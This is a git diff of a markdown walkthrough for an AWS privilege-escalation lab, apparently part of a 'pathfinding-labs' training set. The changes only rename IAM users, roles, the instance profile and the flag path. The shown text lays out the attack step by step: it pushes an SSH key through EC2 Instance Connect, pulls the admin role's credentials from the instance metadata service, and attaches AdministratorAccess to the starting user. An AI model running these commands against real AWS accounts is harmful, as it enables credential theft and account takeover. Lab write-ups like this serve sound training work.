@@ -8,9 +8,9 @@ This attack is particularly dangerous because it provides direct access to high-
 
 ## The Challenge
 
-You start as `pl-prod-ec2-003-to-admin-starting-user`, an IAM user whose credentials were provided via Terraform outputs. This user has a narrow set of permissions: `ec2-instance-connect:SendSSHPublicKey` on the target EC2 instance, plus helpful recon permissions (`ec2:DescribeInstances`, `iam:GetInstanceProfile`, `iam:GetRole`).
+You start as `pl-prod-ec2instanceconnect-003-to-admin-starting-user`, an IAM user whose credentials were provided via Terraform outputs. This user has a narrow set of permissions: `ec2-instance-connect:SendSSHPublicKey` on the target EC2 instance, plus helpful recon permissions (`ec2:DescribeInstances`, `iam:GetInstanceProfile`, `iam:GetRole`).
 
-Your goal is to reach `pl-prod-ec2-003-to-admin-ec2-admin-role`, an IAM role with `AdministratorAccess` that is attached to an EC2 instance via its instance profile. You cannot assume this role directly — but you can get inside the machine that's already running as it.
+Your goal is to reach `pl-prod-ec2instanceconnect-003-to-admin-ec2-admin-role`, an IAM role with `AdministratorAccess` that is attached to an EC2 instance via its instance profile. You cannot assume this role directly — but you can get inside the machine that's already running as it.
 
 ## Reconnaissance
 
@@ -18,7 +18,7 @@ First, confirm your starting identity:
 
 ```bash
 aws sts get-caller-identity --query 'Arn' --output text
-# arn:aws:iam::<account_id>:user/pl-prod-ec2-003-to-admin-starting-user
+# arn:aws:iam::<account_id>:user/pl-prod-ec2instanceconnect-003-to-admin-starting-user
 ```
 
 Try something that requires elevated permissions to confirm you don't already have it:
@@ -39,9 +39,9 @@ aws ec2 describe-instances \
 You'll find an instance with an instance profile attached. To check what role that instance profile maps to, use `iam:GetInstanceProfile`:
 
 ```bash
-aws iam get-instance-profile --instance-profile-name pl-prod-ec2-003-to-admin-instance-profile \
+aws iam get-instance-profile --instance-profile-name pl-prod-ec2instanceconnect-003-to-admin-instance-profile \
   --query 'InstanceProfile.Roles[0].RoleName' --output text
-# pl-prod-ec2-003-to-admin-ec2-admin-role
+# pl-prod-ec2instanceconnect-003-to-admin-ec2-admin-role
 ```
 
 Then verify the role's permissions with `iam:GetRole` and associated policy calls — you'll confirm it has `AdministratorAccess`. You've found your target.
@@ -84,7 +84,7 @@ ssh -i /tmp/ec2-connect-key \
   'TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"); ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/); curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME'
 ```
 
-The output is a JSON object containing `AccessKeyId`, `SecretAccessKey`, and `Token` for `pl-prod-ec2-003-to-admin-ec2-admin-role`.
+The output is a JSON object containing `AccessKeyId`, `SecretAccessKey`, and `Token` for `pl-prod-ec2instanceconnect-003-to-admin-ec2-admin-role`.
 
 ### Step 4: Configure credentials and escalate
 
@@ -100,7 +100,7 @@ Now use the admin role credentials to attach `AdministratorAccess` to the starti
 
 ```bash
 aws iam attach-user-policy \
-  --user-name pl-prod-ec2-003-to-admin-starting-user \
+  --user-name pl-prod-ec2instanceconnect-003-to-admin-starting-user \
   --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
 ```
 
@@ -128,7 +128,7 @@ Using your starting user credentials (which, thanks to the previous step, now ho
 
 ```bash
 aws ssm get-parameter \
-    --name /pathfinding-labs/flags/ec2-003-to-admin \
+    --name /pathfinding-labs/flags/ec2instanceconnect-003-to-admin \
     --query 'Parameter.Value' \
     --output text
 # flag{...}  — your scenario-specific flag value
